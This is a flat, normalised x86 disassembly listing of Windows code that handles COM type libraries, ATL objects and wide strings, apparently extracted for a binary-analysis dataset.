cmp [ esi + 0xa ] cx
jne r-xdata
xor eax eax
add eax 0x4
jmp r-xdata
mov ecx [ rw-data ]
push 0x104
lea eax [ esp + 0x28 ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
cmp eax ebx
je r-xdata
mov [ esp + 0x238 ] 0x3
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push esi
push sub_406650
push eax
call [ Ordinal_ATL71_58@IAT ]
mov [ esp + 0x238 ] 0x5
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
cmp eax 0x104
je r-xdata
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
call [ rw-data ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x238 ] 0x1
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x28 ]
push eax
call [ LoadTypeLib@IAT ]
mov edi eax
mov [ esp + 0x238 ] bl
jmp r-xdata
cmp edi ebx
jl r-xdata
sub_406360
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push edi
mov edi [ free@IAT ]
nop
mov eax [ esi ]
mov ecx [ eax ]
push eax
mov [ esi ] ecx
call edi
mov eax [ esi ]
add esp 0x4
test eax eax
jne r-xdata
pop edi
sub_4063b0
push 0xffffffff
push sub_42f738
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx ]
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4063f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42f763
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
lea ecx [ ebp - 0x24 ]
push ecx
push ebx
call [ eax + 0xc ]
xor ecx ecx
cmp eax ecx
jl r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x24 ]
movzx eax [ edx + 0x2c ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x14 ] ecx
cmp eax ecx
je r-xdata
mov [ ebp - 0x20 ] ecx
cmp [ edi + 0x18 ] ecx
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov esi [ edi + 0x18 ]
mov [ ebp - 0x30 ] esi
lea ecx [ esi + esi * 2 ]
lea edx [ ecx * 4 + 0x4 ]
push edx
call j_sub_42e3bc
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ edi + 0x14 ] eax
mov ecx [ ebx ]
mov edx [ ebp - 0x24 ]
push edx
push ebx
call [ ecx + 0x4c ]
mov esi [ ebp - 0x18 ]
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] al
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov [ eax ] esi
add eax 0x4
mov [ ebp - 0x2c ] eax
push sub_403d30
push sub_4065b0
push esi
push 0xc
push eax
call sub_42e894
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
add esi 0xc
cmp eax [ edi + 0x18 ]
jl r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov edx [ ebx ]
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x1c ]
mov eax [ ecx ]
push eax
push ebx
call [ edx + 0x30 ]
test eax eax
jl r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
test eax eax
jne r-xdata
mov edx [ ebx ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
push ebx
call [ edx + 0x14 ]
test eax eax
jl r-xdata
mov eax [ ebx ]
mov ecx [ ebp - 0x1c ]
push ecx
push ebx
call [ eax + 0x50 ]
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp - 0x14 ]
push edx
call [ SysFreeString@IAT ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x0
mov eax [ esi ]
cmp eax edi
je r-xdata
xor ecx ecx
mov eax [ ebx ]
mov ecx [ ebp - 0x24 ]
push ecx
push ebx
call [ eax + 0x4c ]
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
push eax
call [ SysStringLen@IAT ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov [ esi + 0x8 ] edx
mov edi [ ebp - 0x28 ]
push eax
call [ SysFreeString@IAT ]
mov [ esi ] edi
sub_4065b0
push 0xffffffff
push sub_42f778
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
xor ecx ecx
mov [ esp ] eax
mov [ eax ] ecx
mov [ esp + 0xc ] ecx
mov [ eax + 0x4 ] ecx
or ecx 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4065f0
push 0xffffffff
push sub_42f798
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx ]
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_406650
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
mov [ esi + 0xc ] 0x0
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esi + 0x14 ] 0x0
mov edx [ eax - 0x4 ]
push edi
lea edi [ eax - 0x4 ]
push sub_403d30
push edx
push 0xc
push eax
call sub_42e834
push edi
call ??_V@YAXPAX@Z
add esp 0x4
pop edi
sub_4066a0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
mov ecx rw-data
call sub_4066d0
retn 0x18
sub_4066d0
sub esp 0x8
push ebp
mov ebp ecx
mov ecx [ ebp + 0xc ]
xor eax eax
test ecx ecx
je r-xdata
mov eax [ esp + 0x1c ]
push eax
mov ecx ebp
call sub_4060d0
mov ecx [ ebp + 0x14 ]
test ecx ecx
jne r-xdata
pop ebp
add esp 0x8
retn 0x14
mov eax [ ebp + 0x14 ]
test eax eax
push ebx
push esi
push edi
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
mov ebp [ ebp + 0xc ]
mov edx [ ebp ]
push eax
mov eax [ esp + 0x24 ]
push ecx
push eax
push ebp
call [ edx + 0x28 ]
pop edi
pop esi
pop ebx
cmp [ esp + 0x24 ] 0x1
jne r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ ecx ]
push eax
call [ lstrlenW@IAT ]
mov edx [ ebp + 0x18 ]
dec edx
mov [ esp + 0x10 ] eax
js r-xdata
mov eax [ ebp + 0x14 ]
lea ebx [ edx + edx * 2 ]
shl ebx 0x2
mov [ esp + 0x14 ] eax
lea eax [ ebx + eax + 0x4 ]
mov [ esp + 0x28 ] eax
lea ebx [ ebx ]
mov eax [ esp + 0x28 ]
dec edx
sub eax 0xc
sub ebx 0xc
test edx edx
mov [ esp + 0x28 ] eax
jge r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ esp + 0x20 ]
mov ecx [ eax + ebx + 0x4 ]
mov edi [ esi ]
mov esi [ eax + ebx ]
add eax ebx
shl ecx 0x1
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx [ eax ]
jne r-xdata
lea ecx [ edx + edx * 2 ]
mov edx [ esp + 0x14 ]
mov eax [ edx + ecx * 4 + 0x8 ]
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
mov [ ecx ] eax
xor eax eax
pop ebp
add esp 0x8
retn 0x14
sub_4067c0
push 0xffffffff
push sub_42f7d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ esp + 0xc ] 0x0
mov [ esp + 0x18 ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
cmp edx [ r--data ]
jne r-xdata
mov esi [ rw-data ]
mov ebx [ esp + 0x28 ]
xor edi edi
test esi esi
jne r-xdata
mov edx [ eax + 0x4 ]
cmp edx [ r--data ]
jne r-xdata
test esi esi
mov [ esp + 0xc ] esi
je r-xdata
push ebx
mov ecx rw-data
call sub_4060d0
mov esi [ rw-data ]
mov edi eax
mov edx [ eax + 0x8 ]
cmp edx [ r--data ]
jne r-xdata
test edi edi
jge r-xdata
mov ecx [ esi ]
push esi
call [ ecx + 0x4 ]
mov eax [ eax + 0xc ]
cmp eax [ r--data ]
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push eax
push ebx
push ecx
push edx
push esi
call sub_4068d0
add esp 0x14
mov edi eax
mov [ esp + 0x18 ] 0xffffffff
test esi esi
je r-xdata
mov [ esp + 0x18 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax edi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x10
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
lea edx [ ecx + 0x4 ]
lea eax [ ecx + 0x14 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
mov dx [ ecx + 0x24 ]
mov [ rw-data ] dx
mov ax [ ecx + 0x26 ]
mov [ rw-data ] ax
mov edx [ esi ]
push esi
call [ edx + 0x8 ]
jmp r-xdata
sub_4068d0
push ecx
push ebx
mov ebx [ esp + 0xc ]
push edi
xor edi edi
cmp ebx edi
jne r-xdata
mov eax [ ebx ]
lea ecx [ esp + 0x8 ]
push ecx
push ebx
mov [ esp + 0x18 ] edi
call [ eax + 0xc ]
cmp eax edi
jl r-xdata
pop edi
mov eax 0x80070057
pop ebx
pop ecx
retn
pop edi
pop ebx
pop ecx
retn
mov edx [ esp + 0x8 ]
push ebp
push esi
xor esi esi
cmp [ edx + 0x2c ] di
jbe r-xdata
mov eax [ esp + 0x10 ]
mov edx [ ebx ]
push eax
push ebx
call [ edx + 0x4c ]
mov eax [ esp + 0x18 ]
cmp eax edi
je r-xdata
mov ebp [ esp + 0x20 ]
nop
pop esi
pop ebp
pop edi
mov eax 0x80004005
pop ebx
pop ecx
retn
mov cx [ eax + 0x18 ]
cmp cx 0x8
jle r-xdata
pop esi
pop ebp
mov eax [ esp + 0x18 ]
cmp [ eax ] ebp
je r-xdata
xor ebp ebp
cmp cx di
jle r-xdata
mov edx [ ebx ]
push eax
push ebx
call [ edx + 0x50 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x18 ] edi
movzx ecx [ eax + 0x2c ]
inc esi
cmp esi ecx
jl r-xdata
mov cx [ eax + 0x24 ]
movzx edx cx
add edx 0xffffffea
cmp edx 0x3
ja r-xdata
mov esi [ esp + 0x28 ]
add esi 0x8
lea ebx [ ebx ]
mov eax [ ebx ]
lea ecx [ esp + 0x18 ]
push ecx
push esi
push ebx
call [ eax + 0x14 ]
cmp eax edi
jl r-xdata
mov edx [ esp + 0x28 ]
mov [ edx + 0x4 ] cx
mov ecx [ eax + 0x14 ]
mov [ edx ] ecx
mov cx [ eax + 0x18 ]
push eax
mov [ edx + 0x6 ] cx
mov edx [ ebx ]
push ebx
call [ edx + 0x50 ]
xor eax eax
jmp [ edx * 4 + jump_table_406a24 ]
cmp [ esi ] 0x1d
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + edi ]
mov dx [ ecx + 0x4 ]
or dx 0x4000
mov [ esi ] dx
mov ecx 0x3
jmp r-xdata
mov ecx 0x13
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov ecx 0xa
movsx edx [ eax + 0x18 ]
inc ebp
add esi 0x2
add edi 0x10
cmp ebp edx
jl r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + edi ]
push ecx
push ebx
call sub_406a40
mov [ esi ] ax
mov eax [ esp + 0x20 ]
add esp 0x8
mov ecx [ eax + 0x8 ]
mov cx [ ecx + edi + 0x4 ]
cmp cx 0x1a
mov [ esi ] cx
jne r-xdata
xor edi edi
sub_406a40
push 0xffffffff
push sub_42f800
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x14 ] 0x1
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
lea edx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x24 ]
push edx
push eax
mov esi 0x1d
call [ ecx + 0x38 ]
test eax eax
jge r-xdata
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] 0x0
mov edx [ eax ]
push eax
call [ edx + 0xc ]
test eax eax
mov ecx [ esp + 0x8 ]
jl r-xdata
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov ax 0x1d
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x4c ]
mov eax [ ecx + 0x28 ]
cmp eax 0x6
je r-xdata
mov ecx [ esp + 0xc ]
mov ax si
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov dx [ ecx + 0x40 ]
cmp dx 0x1d
jne r-xdata
test eax eax
jne r-xdata
sub eax 0x0
je r-xdata
mov edx [ ecx + 0x3c ]
mov eax [ esp + 0x4 ]
push edx
push eax
call sub_406a40
mov ecx [ esp + 0x10 ]
add esp 0x8
mov esi eax
jmp r-xdata
mov esi 0x3
sub eax 0x3
je r-xdata
mov esi 0xd
jmp r-xdata
dec eax
je r-xdata
mov esi 0x9
jmp r-xdata
mov esi edx
jmp r-xdata
sub_406b60
push 0xffffffff
push sub_42f826
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
mov ecx edi
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
call sub_405bf0
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esi ] r--data
mov [ edi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
mov [ esi + 0x10 ] r--data
mov [ esi + 0x34 ] eax
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_406be0
push 0xffffffff
push sub_42f838
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_406b60
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x18 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
mov [ esi + 0x10 ] r--data
mov [ esi + 0x14 ] eax
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_406d40
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_406db0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f858
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi ecx
mov [ esp + 0x10 ] 0x0
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
mov [ esp + 0x10 ] 0xffffffff
test edi edi
je r-xdata
push r--data
push esi
push eax
call sub_42cef0
mov ecx [ esi ]
push eax
push esi
call [ ecx + 0xa4 ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov ecx edi
call sub_405450
mov [ esp + 0x18 ] 0x0
sub_406e30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f878
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi ecx
mov [ esp + 0x10 ] 0x0
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
mov [ esp + 0x10 ] 0xffffffff
test edi edi
je r-xdata
push r--data
push esi
push eax
call sub_42cef0
mov ecx [ esi ]
push eax
push esi
call [ ecx + 0xac ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov ecx edi
call sub_405450
mov [ esp + 0x18 ] 0x0
sub_406eb0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f898
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi ecx
mov [ esp + 0x10 ] 0x0
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
mov [ esp + 0x10 ] 0xffffffff
test edi edi
je r-xdata
push r--data
push esi
push eax
call sub_42cef0
mov ecx [ esi ]
push eax
push esi
call [ ecx + 0xc4 ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov ecx edi
call sub_405450
mov [ esp + 0x18 ] 0x0
sub_406f30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f8b8
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi ecx
mov [ esp + 0x10 ] 0x0
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
mov [ esp + 0x10 ] 0xffffffff
test edi edi
je r-xdata
push r--data
push esi
push eax
call sub_42cef0
mov ecx [ esi ]
push eax
push esi
call [ ecx + 0xe4 ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov ecx edi
call sub_405450
mov [ esp + 0x18 ] 0x0
sub_406fb0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f8d8
push eax
mov [ fs : 0x0 ] esp
push ebx
push esi
push edi
mov edi ecx
mov [ esp + 0x14 ] 0x0
mov ebx [ esp + 0x20 ]
test ebx ebx
je r-xdata
xor eax eax
mov eax [ ebx ]
jmp r-xdata
mov [ esp + 0x14 ] 0xffffffff
test ebx ebx
je r-xdata
push r--data
push edi
push esi
call sub_42cef0
mov edx [ esp + 0x1c ]
mov ecx [ edi ]
push eax
push edx
push edi
call [ ecx + 0xe8 ]
mov esi eax
test esi esi
jge r-xdata
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x8
mov ecx ebx
call sub_405450
mov [ esp + 0x20 ] 0x0
sub_407040
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f8f8
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi ecx
mov [ esp + 0x10 ] 0x0
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
mov [ esp + 0x10 ] 0xffffffff
test edi edi
je r-xdata
push r--data
push esi
push eax
call sub_42cef0
mov ecx [ esi ]
push eax
push esi
call [ ecx + 0x134 ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov ecx edi
call sub_405450
mov [ esp + 0x18 ] 0x0
sub_4070c0
push 0xffffffff
push sub_42f931
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x1c ] 0x1
mov edi [ esp + 0x28 ]
cmp edi ebx
mov [ esp + 0xc ] ebx
je r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
mov eax [ esp + 0xc ]
mov esi [ esp + 0x24 ]
push ebx
push eax
mov ecx esi
call sub_404250
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x1c ] bl
cmp edi ebx
je r-xdata
push r--data
push esi
push eax
call sub_42cef0
mov ecx [ esi ]
lea edx [ esp + 0xc ]
push edx
push eax
push esi
call [ ecx + 0x174 ]
cmp eax ebx
jge r-xdata
mov ecx [ esp + 0x14 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
mov ecx edi
call sub_405450
mov [ esp + 0x28 ] ebx
sub_407160
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f951
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push esi
mov esi ecx
mov eax [ esi + 0xa8 ]
test eax eax
push edi
jne r-xdata
mov ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0xc ]
push r--data
push edx
call sub_4040a0
add esp 0xc
mov [ esp + 0x2c ] 0x0
lea edi [ esi + 0x94 ]
push eax
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
mov [ esp + 0x2c ] 0xffffffff
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov eax [ esp + 0x34 ]
lea edi [ esi + 0x94 ]
push eax
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
jmp r-xdata
mov ecx [ esi + 0x1c ]
mov [ esp + 0x30 ] 0xffffffff
call sub_407040
mov ecx [ esp + 0x24 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x28
retn 0x4
push 0x80004003
call sub_42cee0
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push ecx
mov ecx esp
mov [ esp + 0x38 ] esp
push eax
call sub_4041b0
mov [ esp + 0x30 ] 0x1
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
sub_407230
push 0xffffffff
push sub_42f968
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
test eax eax
push edi
jne r-xdata
mov edi [ esi + 0x1c ]
mov eax [ edi ]
lea ecx [ esp + 0xc ]
push ecx
push edi
mov [ esp + 0x14 ] 0x0
call [ eax + 0x90 ]
test eax eax
jge r-xdata
push 0x80004003
call sub_42cee0
cmp [ esp + 0xc ] 0x0
je r-xdata
push r--data
push edi
push eax
call sub_42cef0
mov ecx [ esp + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push ecx
mov ecx esp
mov [ esp + 0x24 ] esp
push eax
call sub_4041b0
mov [ esp + 0x1c ] 0x0
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x1c ]
mov [ esp + 0x1c ] 0xffffffff
push 0x0
call sub_406fb0
test eax eax
jge r-xdata
push 0x80004003
call sub_42cee0
mov edi [ esi + 0x1c ]
mov edx [ edi ]
push edi
call [ edx + 0x74 ]
mov ebx eax
test ebx ebx
jge r-xdata
push 0x80004003
call sub_42cee0
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
push r--data
push edi
push ebx
call sub_42cef0
mov eax ebx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
mov esi [ esi + 0x1c ]
mov eax [ esi ]
push esi
call [ eax + 0x70 ]
mov edi eax
test edi edi
jge r-xdata
push 0x80004003
call sub_42cee0
mov ecx [ esp + 0x10 ]
xor eax eax
test edi edi
pop edi
pop esi
setge al
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x10
retn 0x4
push r--data
push esi
push edi
call sub_42cef0
sub_407380
push 0xffffffff
push sub_42f9aa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
xor ebx ebx
mov esi ecx
mov [ esp + 0x8 ] ebx
mov ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push ecx
mov ecx esp
mov [ esp + 0x10 ] esp
push eax
call sub_4041b0
mov [ esp + 0x1c ] 0x1
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov ecx [ esi + 0x1c ]
mov [ esp + 0x1c ] bl
lea eax [ esp + 0x28 ]
push eax
call sub_4070c0
mov [ esp + 0x18 ] 0x2
mov eax [ eax ]
cmp eax ebx
je r-xdata
push 0x80004003
call sub_42cee0
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x14
retn 0x8
call sub_405450
mov [ esp + 0x24 ] ebx
mov esi [ esp + 0x20 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x8 ] 0x1
mov [ esp + 0x18 ] bl
mov ecx [ esp + 0x24 ]
cmp ecx ebx
je r-xdata
sub_407440
sub esp 0x1c
mov eax [ rw-data ]
mov edx [ esp + 0x24 ]
push ebx
push esi
mov [ esp + 0x20 ] eax
push edi
mov ebx r--data
mov eax [ ebx + 0x1c ]
add ebx 0x18
test eax eax
jne r-xdata
cmp [ ebx + 0xc ] edx
jne r-xdata
cmp [ ebx ] 0x1
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x18 ]
call sub_42e72f
add esp 0x1c
retn 0x24
mov esi [ ebx + 0x4 ]
mov ecx 0x4
mov edi r--data
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov eax [ ebx + 0x14 ]
test eax eax
mov esi [ esp + 0x2c ]
je r-xdata
mov eax [ esi ]
lea edi [ esp + 0xc ]
mov ecx edi
push ecx
mov ecx [ esp + 0x3c ]
push ecx
push edx
push r--data
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jl r-xdata
mov edi eax
jmp r-xdata
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x40 ]
mov ecx [ ebx + 0x10 ]
push edx
push eax
push edi
push ecx
mov ecx esi
call sub_4074f0
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebx
call sub_42e72f
add esp 0x1c
retn 0x24
sub_4074f0
push 0xffffffff
push sub_42f9c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push ebx
mov ebx [ esp + 0x5c ]
mov ax [ ebx + 0x6 ]
cmp ax 0x8
mov [ esp + 0x4 ] ecx
jle r-xdata
mov edx [ esp + 0x60 ]
neg ax
push ebp
lea ecx [ esp + 0x2c ]
push esi
push edi
sbb eax eax
and eax ecx
mov ecx [ edx + 0xc ]
mov edi eax
xor eax eax
test ecx ecx
jbe r-xdata
mov eax 0x80004005
pop ebx
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
cmp eax [ edx + 0x8 ]
jae r-xdata
xor esi esi
mov eax [ esp + 0x10 ]
